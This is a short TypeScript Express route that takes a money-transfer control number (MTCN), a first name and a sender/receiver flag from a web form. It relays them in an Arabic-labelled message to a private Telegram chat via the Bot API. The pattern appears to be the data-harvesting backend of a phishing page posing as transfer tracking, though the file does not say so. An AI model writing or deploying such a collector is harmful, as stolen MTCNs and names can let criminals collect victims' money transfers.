import { Router } from "express";

const router = Router();

router.post("/telegram/notify", async (req, res) => {
  const { mtcn, name, tab } = req.body as { mtcn: string; name: string; tab: string };

  const token = process.env.TELEGRAM_BOT_TOKEN;
  const chatId = process.env.TELEGRAM_CHAT_ID;

  if (!token || !chatId) {
    res.status(500).json({ error: "Telegram not configured" });
    return;
  }

  const tabLabel = tab === "sender" ? "المرسل" : "المستلم";
  const message =
    `🔔 *تتبع تحويل جديد*\n\n` +
    `👤 *النوع:* ${tabLabel}\n` +
    `🔢 *رقم MTCN:* \`${mtcn}\`\n` +
    `📛 *الاسم الأول:* ${name || "—"}`;

  const url = `https://api.telegram.org/bot${token}/sendMessage`;

  const response = await fetch(url, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({
      chat_id: chatId,
      text: message,
      parse_mode: "Markdown",
    }),
  });

  const data = await response.json() as { ok: boolean; description?: string };

  if (!data.ok) {
    req.log.error({ data }, "Telegram API error");
    res.status(500).json({ error: data.description });
    return;
  }

  res.json({ ok: true });
});

export default router;
